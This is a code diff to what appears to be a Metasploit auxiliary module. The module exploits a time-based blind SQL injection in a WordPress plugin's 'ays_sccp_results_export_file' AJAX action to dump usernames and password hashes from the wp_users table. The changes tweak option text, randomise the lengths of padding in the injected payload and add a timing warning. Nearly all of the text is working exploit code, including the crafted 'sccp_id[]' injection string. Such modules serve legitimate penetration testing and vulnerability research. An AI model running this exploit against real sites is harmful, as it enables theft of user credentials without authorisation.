@@ -52,7 +52,7 @@ class MetasploitModule < Msf::Auxiliary
       )
     )
     register_options [
-      OptInt.new('USER_COUNT', [true, 'Number of users to enumerate', 3])
+      OptInt.new('USER_COUNT', [true, 'Number of user credentials to enumerate', 3])
     ]
   end
 
@@ -70,7 +70,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run_host(ip)
-    id = Rex::Text.rand_text_numeric(1)
+    id = Rex::Text.rand_text_numeric(1..20)
     @sqli = create_sqli(dbms: MySQLi::TimeBasedBlind, opts: { hex_encode_strings: true }) do |payload|
       res = send_request_cgi({
         'method' => 'POST',
@@ -78,7 +78,7 @@ class MetasploitModule < Msf::Auxiliary
         'uri' => normalize_uri(target_uri.path, 'wp-admin', 'admin-ajax.php'),
         'vars_get' => {
           'action' => 'ays_sccp_results_export_file',
-          'sccp_id[]' => "#{id}) AND (SELECT #{Rex::Text.rand_text_numeric(4)} FROM (SELECT(#{payload}))#{Rex::Text.rand_text_alpha(4)})-- #{Rex::Text.rand_text_alpha(4)}",
+          'sccp_id[]' => "#{id}) AND (SELECT #{Rex::Text.rand_text_numeric(4..20)} FROM (SELECT(#{payload}))#{Rex::Text.rand_text_alpha(4..20)})-- #{Rex::Text.rand_text_alpha(4..20)}",
           'type' => 'json'
         }
       })
@@ -92,6 +92,7 @@ class MetasploitModule < Msf::Auxiliary
     columns = ['user_login', 'user_pass']
 
     print_status('Enumerating Usernames and Password Hashes')
+    print_warning('Each user will take about 5-10 minutes to enumerate. Be patient.')
     data = @sqli.dump_table_fields('wp_users', columns, '', datastore['USER_COUNT'])
 
     table = Rex::Text::Table.new('Header' => 'wp_users', 'Indent' => 1, 'Columns' => columns)
